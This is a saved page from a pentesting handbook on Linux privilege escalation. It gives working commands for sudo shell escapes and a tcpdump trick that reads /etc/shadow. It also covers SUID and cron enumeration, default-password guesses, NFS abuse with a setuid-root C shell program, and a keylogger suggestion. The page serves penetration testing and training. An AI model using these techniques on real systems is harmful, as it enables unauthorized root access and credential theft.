                <a href="https://chryzsh.gitbooks.io/pentestbook/content/pluck-1.html">
            
                    
                    Pluck 1
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.1.3" data-path="writeups/vulnhub/kioptrix-1.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/writeups/vulnhub/kioptrix-1.html">
            
                    
                    kioptrix 1
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.16.1.4" data-path="writeups/vulnhub/kioptrix-2.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/writeups/vulnhub/kioptrix-2.html">
            
                    
                    kioptrix 2
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.16.2" data-path="writeups/sans-holiday-hack-2016.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/writeups/sans-holiday-hack-2016.html">
            
                    
                    SANS Holiday Hack 2016
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.17" data-path="writeups/nsm-hack-chris.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/writeups/nsm-hack-chris.html">
            
                    
                    nsm hack
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.18" data-path="roadmap.html">
            
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/roadmap.html">
            
                    
                    roadmap
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    
</ul>


                </nav>
            
        
    
<div class="gl-wrapper">
    <a class="gitbook-link" href="https://www.gitbook.com/?utm_source=public_site_legacy&amp;utm_medium=referral&amp;utm_campaign=trademark&amp;utm_term=chryzsh&amp;utm_content=powered_by" target="blank">
        <div class="tm-logo">
            <svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="currentColor" viewBox="0 0 1067 769" xmlns="http://www.w3.org/2000/svg" stroke="none" class="icon-7f6730be--text-3f89f380"><g><path d="M480.026 640.677c17.205 0 31.2 13.997 31.2 31.194s-13.995 31.193-31.2 31.193c-17.197 0-31.193-13.996-31.193-31.193 0-17.197 13.996-31.194 31.193-31.194m489.93-193.226c-17.203 0-31.2-13.998-31.2-31.195 0-17.204 13.997-31.2 31.2-31.2 17.198 0 31.194 13.996 31.194 31.2 0 17.197-13.996 31.195-31.193 31.195m0-127.804c-53.269 0-96.609 43.34-96.609 96.609 0 10.373 1.723 20.702 5.123 30.741L559.328 616.879c-18.132-26.128-47.521-41.617-79.302-41.617-36.821 0-70.391 21.065-86.63 54.003L106.68 478.109c-30.288-15.927-52.965-65.817-50.56-111.223 1.248-23.687 9.438-42.071 21.897-49.17 7.916-4.493 17.436-4.099 27.526 1.188l1.916 1.01c75.96 40.022 324.6 170.981 335.063 175.844 16.157 7.47 25.14 10.5 52.659-2.547l513.958-267.3c7.53-2.844 16.315-10.062 16.315-21.023 0-15.205-15.72-21.199-15.765-21.199-29.218-14.018-74.163-35.054-117.987-55.57C798.033 84.26 691.861 34.547 645.23 10.132c-40.253-21.072-72.655-3.311-78.432.282l-11.227 5.555C345.727 119.743 64.898 258.826 48.911 268.553 20.278 285.973 2.547 320.679.252 363.768c-3.586 68.304 31.261 139.506 81.069 165.634l303.172 156.354c6.83 47.306 47.55 82.725 95.532 82.725 52.78 0 95.808-42.546 96.603-95.14L910.541 492.38c16.93 13.233 37.92 20.486 59.416 20.486 53.268 0 96.61-43.341 96.61-96.61s-43.342-96.61-96.61-96.61" fill-rule="evenodd"></path></g></svg>
        </div>
        <div class="tm-content">
            <div class="tm-container">
                <span class="tm-text">
                    Powered by <b>GitBook</b>
                </span>
            </div>
        </div>
    </a>
</div></div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <a class="btn pull-left js-toolbar-action" aria-label="" href="#"><i class="fa fa-align-justify"></i></a><div class="dropdown pull-right js-toolbar-action"><a class="btn toggle-dropdown" aria-label="Share" href="#"><i class="fa fa-share-alt"></i></a><div class="dropdown-menu dropdown-left"><div class="dropdown-caret"><span class="caret-outer"></span><span class="caret-inner"></span></div><div class="buttons"><button class="button size-5 ">Facebook</button><button class="button size-5 ">Google+</button><button class="button size-5 ">Twitter</button><button class="button size-5 ">Weibo</button><button class="button size-5 ">Instapaper</button></div></div></div><a class="btn pull-right js-toolbar-action" aria-label="" href="#"><i class="fa fa-facebook"></i></a><a class="btn pull-right js-toolbar-action" aria-label="" href="#"><i class="fa fa-twitter"></i></a><div class="dropdown pull-left font-settings js-toolbar-action"><a class="btn toggle-dropdown" aria-label="Font Settings" href="#"><i class="fa fa-font"></i></a><div class="dropdown-menu dropdown-right"><div class="dropdown-caret"><span class="caret-outer"></span><span class="caret-inner"></span></div><div class="buttons"><button class="button size-2 font-reduce">A</button><button class="button size-2 font-enlarge">A</button></div><div class="buttons"><button class="button size-2 ">Serif</button><button class="button size-2 ">Sans</button></div><div class="buttons"><button class="button size-3 ">White</button><button class="button size-3 ">Sepia</button><button class="button size-3 ">Night</button></div></div></div><h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href="https://chryzsh.gitbooks.io/pentestbook/content/">Privilege Escalation - Linux</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="privilege-escalation">Privilege Escalation</h1>
<p>Once we have a limited shell it is useful to escalate that shells 
privileges. This way it will be easier to hide, read and write any 
files, and persist between reboots.</p>
<p>In this chapter I am going to go over these common Linux privilege escalation techniques:</p>
<ul>
<li>Kernel exploits</li>
<li>Programs running as root</li>
<li>Installed software</li>
<li>Weak/reused/plaintext passwords</li>
<li>Inside service</li>
<li>Suid misconfiguration</li>
<li>Abusing sudo-rights</li>
<li>World writable scripts invoked by root</li>
<li>Bad path configuration</li>
<li>Cronjobs</li>
<li>Unmounted filesystems</li>
</ul>
<h2 id="enumeration-scripts">Enumeration scripts</h2>
<p>I have used principally three scripts that are used to enumerate a 
machine. They are some difference between the scripts, but they output a
 lot of the same. So test them all out and see which one you like best.</p>
<p><strong>LinEnum</strong></p>
<p><a href="https://github.com/rebootuser/LinEnum" target="_blank">https://github.com/rebootuser/LinEnum</a></p>
<p>Here are the options:</p>
<pre><code>-k Enter keyword
-e Enter export location
-t Include thorough (lengthy) tests
-r Enter report name
-h Displays this help text
</code></pre><p><strong>Unix privesc</strong></p>
<p><a href="http://pentestmonkey.net/tools/audit/unix-privesc-check" target="_blank">http://pentestmonkey.net/tools/audit/unix-privesc-check</a><br>Run the script and save the output in a file, and then grep for warning in it.</p>
<p><strong>Linprivchecker.py</strong></p>
<p><a href="https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py" target="_blank">https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py</a></p>
<h2 id="privilege-escalation-techniques">Privilege Escalation Techniques</h2>
<h3 id="kernel-exploits">Kernel Exploits</h3>
<p>By exploiting vulnerabilities in the Linux Kernel we can sometimes 
escalate our privileges. What we usually need to know to test if a 
kernel exploit works is the OS, architecture and kernel version.</p>
<p>Check the following:</p>
<p>OS:</p>
<p>Architecture:</p>
<p>Kernel version:</p>
<pre><code>uname -a
cat /proc/version
cat /etc/issue
</code></pre><p><strong>Search for exploits</strong></p>
<pre><code>site:exploit-db.com kernel version

python linprivchecker.py extended
</code></pre><p>Don't use kernel exploits if you can avoid it. If you 
use it it might crash the machine or put it in an unstable state. So 
kernel exploits should be the last resort. Always use a simpler priv-esc
 if you can. They can also produce a lot of stuff in the <code>sys.log</code>. So if you find anything good, put it up on your list and keep searching for other ways before exploiting it.</p>
<h3 id="programs-running-as-root">Programs running as root</h3>
<p>The idea here is that if specific service is running as root and you 
can make that service execute commands you can execute commands as root.
 Look for webserver, database or anything else like that. A typical 
example of this is mysql, example is below.</p>
<p><strong>Check which processes are running</strong></p>
<pre><code># Metasploit
ps

# Linux
ps aux
</code></pre><p><strong>Mysql</strong></p>
<p>If you find that mysql is running as root and you username and 
password to log in to the database you can issue the following commands:</p>
<pre><code class="lang-mysql">select sys_exec('whoami');
select sys_eval('whoami');
</code></pre>
<p>If neither of those work you can use a <a href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/" target="_blank">User Defined Function/</a></p>
<h3 id="user-installed-software">User Installed Software</h3>
<p>Has the user installed some third party software that might be 
vulnerable? Check it out. If you find anything google it for exploits.</p>
<pre><code># Common locations for user installed software
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# Debian
dpkg -l

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info
</code></pre><h3 id="weakreusedplaintext-passwords">Weak/reused/plaintext passwords</h3>
<ul>
<li>Check file where webserver connect to database (<code>config.php</code> or similar)</li>
<li>Check databases for admin passwords that might be reused</li>
<li>Check weak passwords</li>
</ul>
<pre><code>username:username
username:username1
username:root
username:admin
username:qwerty
username:password
</code></pre><ul>
<li>Check plaintext password</li>
</ul>
<pre><code class="lang-bash"><span class="hljs-comment"># Anything interesting the the mail?</span>
/var/spool/mail
</code></pre>
<pre><code>./LinEnum.sh -t -k password
</code></pre><h3 id="service-only-available-from-inside">Service only available from inside</h3>
<p>It might be that case that the user is running some service that is 
only available from that host. You can't connect to the service from the
 outside. It might be a development server, a database, or anything 
else. These services might be running as root, or they might have 
vulnerabilities in them. They might be even more vulnerable since the 
developer or user might be thinking "since it is only accessible for the
 specific user we don't need to spend that much of security".</p>
<p>Check the netstat and compare it with the nmap-scan you did from the 
outside. Do you find more services available from the inside?</p>
<pre><code># Linux
netstat -anlp
netstat -ano
</code></pre><h3 id="suid-and-guid-misconfiguration">Suid and Guid Misconfiguration</h3>
<p>When a binary with suid permission is run it is run as another user, 
and therefore with the other users privileges. It could be root, or just
 another user. If the suid-bit is set on a program that can spawn a 
shell or in another way be abuse we could use that to escalate our 
privileges.</p>
<p>For example, these are some programs that can be used to spawn a shell:</p>
<pre><code>nmap
vim
less
more
</code></pre><p>If these programs have suid-bit set we can use them to 
escalate privileges too. For more of these and how to use the see the 
next section about abusing sudo-rights:</p>
<pre><code>nano
cp
mv
find
</code></pre><p><strong>Find suid and guid files</strong></p>
<pre><code>#Find SUID
find / -perm -u=s -type f 2&gt;/dev/null

#Find GUID
find / -perm -g=s -type f 2&gt;/dev/null
</code></pre><h3 id="abusing-sudo-rights">Abusing sudo-rights</h3>
<p>If you have a limited shell that has access to some programs using <code>sudo</code>
 you might be able to escalate your privileges with. Any program that 
can write or overwrite can be used. For example, if you have sudo-rights
 to <code>cp</code> you can overwrite <code>/etc/shadow</code> or <code>/etc/sudoers</code> with your own malicious file.</p>
<p><code>awk</code></p>
<pre><code>awk 'BEGIN {system("/bin/bash")}'
</code></pre><p><code>bash</code></p>
<p><code>cp</code><br>Copy and overwrite /etc/shadow</p>
<p><code>find</code></p>
<pre><code class="lang-bash">sudo find / -exec bash -i \;

find / -exec /usr/bin/awk <span class="hljs-string">'BEGIN {system("/bin/bash")}'</span> ;
</code></pre>
<p><code>ht</code>  </p>
<p>The text/binary-editor HT.</p>
<p><code>less</code></p>
<p>From less you can go into vi, and then into a shell.</p>
<pre><code>sudo less /etc/shadow
v
:shell
</code></pre><p><code>more</code>  </p>
<p>You need to run more on a file that is bigger than your screen.</p>
<pre><code>sudo more /home/pelle/myfile
!/bin/bash
</code></pre><p><code>mv</code></p>
<p>Overwrite <code>/etc/shadow</code> or <code>/etc/sudoers</code></p>
<p><code>man</code></p>
<p><code>nano</code></p>
<p><code>nc</code></p>
<p><code>nmap</code></p>
<p><code>python/perl/ruby/lua/etc</code></p>
<pre><code>sudo perl
exec "/bin/bash";
ctr-d
</code></pre><pre><code>sudo python
import os
os.system("/bin/bash")
</code></pre><p><code>sh</code></p>
<p><code>tcpdump</code></p>
<pre><code>echo $'id\ncat /etc/shadow' &gt; /tmp/.test
chmod +x /tmp/.test
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
</code></pre><p><code>vi/vim</code></p>
<p>Can be abused like this:</p>
<pre><code>sudo vi
:shell

:set shell=/bin/bash:shell    
:!bash
</code></pre><p><a href="https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/" target="_blank">How I got root with sudo/</a></p>
<h3 id="world-writable-scripts-invoked-as-root">World writable scripts invoked as root</h3>
<p>If you find a script that is owned by root but is writable by anyone 
you can add your own malicious code in that script that will escalate 
your privileges when the script is run as root. It might be part of a 
cronjob, or otherwise automatized, or it might be run by hand by a 
sysadmin. You can also check scripts that are called by these scripts.</p>
<pre><code class="lang-bash"><span class="hljs-comment">#World writable files directories</span>
find / -writable -type d 2&gt;/dev/null
find / -perm -222 -type d 2&gt;/dev/null
find / -perm -o w -type d 2&gt;/dev/null

<span class="hljs-comment"># World executable folder</span>
find / -perm -o x -type d 2&gt;/dev/null

<span class="hljs-comment"># World writable and executable folders</span>
find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null
</code></pre>
<h3 id="bad-path-configuration">Bad path configuration</h3>
<p>Putting <code>.</code> in the path<br>If you put a dot in your path you won't have to write <code>./binary</code> to be able to execute it. You will be able to execute any script or binary that is in the current directory.</p>
<p>Why do people/sysadmins do this? Because they are lazy and won't want to write <code>./.</code></p>
<p>This explains it<br><a href="https://hackmag.com/security/reach-the-root/" target="_blank">https://hackmag.com/security/reach-the-root/</a><br>And here<br><a href="http://www.dankalia.com/tutor/01005/0100501004.htm" target="_blank">http://www.dankalia.com/tutor/01005/0100501004.htm</a></p>
<h3 id="cronjob">Cronjob</h3>
<p>With privileges running script that are editable for other users.</p>
<p>Look for anything that is owned by privileged user but writable for you:</p>
<pre><code>crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
</code></pre><h3 id="unmounted-filesystems">Unmounted filesystems</h3>
<p>Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.</p>
<pre><code>mountâ-l
cat /etc/fstab
</code></pre><h3 id="nfs-share">NFS Share</h3>
<p>If you find that a machine has a NFS share you might be able to use 
that to escalate privileges. Depending on how it is configured.</p>
<pre><code># First check if the target machine has any NFS shares
showmount -e 192.168.1.101

# If it does, then mount it to you filesystem
mount 192.168.1.101:/ /tmp/
</code></pre><p>If that succeeds then you can go to <code>/tmp/share</code>. There might be some interesting stuff there. But even if there isn't you might be able to exploit it.</p>
<p>If you have write privileges you can create files. Test if you can 
create files, then check with your low-priv shell what user has created 
that file. If it says that it is the root-user that has created the file
 it is good news. Then you can create a file and set it with 
suid-permission from your attacking machine. And then execute it with 
your low privilege shell.</p>
<p>This code can be compiled and added to the share. Before executing it
 by your low-priv user make sure to set the suid-bit on it, like this:</p>
<pre><code class="lang-bash">chmod 4777 exploit
</code></pre>
<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
    setuid(<span class="hljs-number">0</span>);
    system(<span class="hljs-string">"/bin/bash"</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h2 id="steal-password-through-a-keylogger">Steal password through a keylogger</h2>
<p>If you have access to an account with sudo-rights but you don't have its password you can install a keylogger to get it.</p>
<h2 id="other-useful-stuff-related-to-privesc">Other useful stuff related to privesc</h2>
<p><strong>World writable directories</strong></p>
<pre><code>/tmp
/var/tmp
/dev/shm
/var/spool/vbox
/var/spool/samba
</code></pre><h2 id="references">References</h2>
<p><a href="http://www.rebootuser.com/?p=1758" target="_blank">http://www.rebootuser.com/?p=1758</a></p>
<p><a href="http://netsec.ws/?p=309" target="_blank">http://netsec.ws/?p=309</a></p>
<p><a href="https://www.trustwave.com/Resources/SpiderLabs-Blog/My-5-Top-Ways-to-Escalate-Privileges/" target="_blank">https://www.trustwave.com/Resources/SpiderLabs-Blog/My-5-Top-Ways-to-Escalate-Privileges/</a></p>
<p>Watch this video!<br><a href="http://www.irongeek.com/i.php?page=videos/bsidesaugusta2016/its-too-funky-in-here04-linux-privilege-escalation-for-fun-profit-and-all-around-mischief-jake-williams" target="_blank">http://www.irongeek.com/i.php?page=videos/bsidesaugusta2016/its-too-funky-in-here04-linux-privilege-escalation-for-fun-profit-and-all-around-mischief-jake-williams</a></p>
<p><a href="http://www.slideshare.net/nullthreat/fund-linux-priv-esc-wprotections" target="_blank">http://www.slideshare.net/nullthreat/fund-linux-priv-esc-wprotections</a></p>
<p><a href="https://www.rebootuser.com/?page_id=1721" target="_blank">https://www.rebootuser.com/?page_id=1721</a></p>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class="search-results-count"></span> results matching "<span class="search-query"></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class="search-query"></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/getting_meterpreter_shell.html" class="navigation navigation-prev " aria-label="Previous page: Meterpreter for Post-Exploitation">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="https://chryzsh.gitbooks.io/pentestbook/content/privilege_escalation_windows.html" class="navigation navigation-next " aria-label="Next page: Privilege Escalation - Windows" style="margin-right: 12px;">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"Privilege Escalation - Linux","level":"1.8.3","depth":2,"next":{"title":"Privilege Escalation - Windows","level":"1.8.4","depth":2,"path":"privilege_escalation_windows.md","ref":"privilege_escalation_windows.md","articles":[]},"previous":{"title":"Meterpreter for Post-Exploitation","level":"1.8.2","depth":2,"path":"getting_meterpreter_shell.md","ref":"getting_meterpreter_shell.md","articles":[]},"dir":"ltr"},"config":{"plugins":["comment"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"comment":{"highlightCommented":true},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"github":"chryzsh/security","theme":"default","author":"chryzsh","pdf":{"pageNumbers":true,"fontSize":16,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"pentestbook","language":"en","links":{"sidebar":{"pentestbook":"https://www.gitbook.com/book/chryzsh/pentestbook"},"gitbook":true},"gitbook":"*","description":""},"file":{"path":"privilege_escalation_-_linux.md","mtime":"2017-07-24T13:06:22.000Z","type":"markdown"},"gitbook":{"version":"3.2.2","time":"2017-07-24T13:09:22.813Z"},"basePath":".","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="Privilege%20Escalation%20-%20Linux%20%C2%B7%20pentestbook_files/gitbook.js"></script>
    <script src="Privilege%20Escalation%20-%20Linux%20%C2%B7%20pentestbook_files/theme.js"></script>
    
        
        <script src="Privilege%20Escalation%20-%20Linux%20%C2%B7%20pentestbook_files/plugin.js"></script>
        
    
        
        <script src="Privilege%20Escalation%20-%20Linux%20%C2%B7%20pentestbook_files/search-engine.js"></script>
        
    
        
        <script src="Privilege%20Escalation%20-%20Linux%20%C2%B7%20pentestbook_files/search.js"></script>
        
    
        
        <script src="Privilege%20Escalation%20-%20Linux%20%C2%B7%20pentestbook_files/lunr.js"></script>
        
    
        
        <script src="Privilege%20Escalation%20-%20Linux%20%C2%B7%20pentestbook_files/search-lunr.js"></script>
        
    
        
        <script src="Privilege%20Escalation%20-%20Linux%20%C2%B7%20pentestbook_files/buttons.js"></script>
        
    
        
        <script src="Privilege%20Escalation%20-%20Linux%20%C2%B7%20pentestbook_files/fontsettings.js"></script>
        
    

    


</body></html>